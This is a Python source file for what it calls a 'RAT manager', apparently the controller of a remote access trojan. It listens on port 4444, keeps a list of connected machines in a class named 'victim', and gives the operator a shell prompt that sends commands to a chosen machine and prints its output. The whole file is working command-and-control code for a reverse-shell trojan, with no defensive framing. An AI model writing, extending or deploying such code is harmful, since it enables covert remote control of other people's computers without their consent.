import socket
from Utilities.Logging.log import Log
from threading import Thread
import json
import pyfiglet


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('127.0.0.1', 4444))
s.listen()


connections = []
addresses = []

def reliable_send(s,data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv(s):
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
class victim:

    def device(self,args):
        conn = connections[int(args)-1]
        while True:
            try:
                cmd = input(f'shell @{connections.index(conn)+1} # ').strip()
                if cmd == 'home':
                    Log.warning("Switching to home.")
                    break
                reliable_send(conn, cmd)
                print(reliable_recv(conn))
            except Exception:
                pos = connections.index(conn)
                connections.pop(pos)
                Log.info(f"{addresses[pos]} left!")
                addresses.pop(pos)
                break
        


    def show(self):
        for i in connections:
            print(i)
        self.home()

    def help(self):
        print('Available commads: ')
        print('\t [1] devices -> displays all the available devices.')
        print('\t [2] home ->switch to home panel.')
        print('\t [3] device [N] ->switch to Nth connection.')
        self.home()
        

    def process(self,cmd):
        line = cmd.split()
        cmd = line[0]
        args = line[1:]
        func = getattr(self, cmd, None)
        if func:
            try:
                func(*args)
            except Exception as e:
                Log.error(f"Error: {e}")
        else:
            Log.error("No such command.")
        self.home()


    def home(self):
        cmd = input("home > ")
        self.process(cmd)

if __name__ == "__main__":
    # if len(sys.argv) != 3:
    #     print ("Usage : ")
    #     print ("\tpython master.py [HOST] [PORT]")
    #     exit(1)
    Log.success(f"Server started at {socket.gethostbyname(socket.gethostname())}:4444")
    Log.success(pyfiglet.figlet_format('RAT manager'))
    obj = victim()
    while True:
        try:
            conn, addr = s.accept()
            Log.success(f"conneted with {addr}")
            obj.home()
            connections.append(conn)
            addresses.append(addr)            
            t = Thread(target = obj.home)
            t.start()
        except Exception:
            break   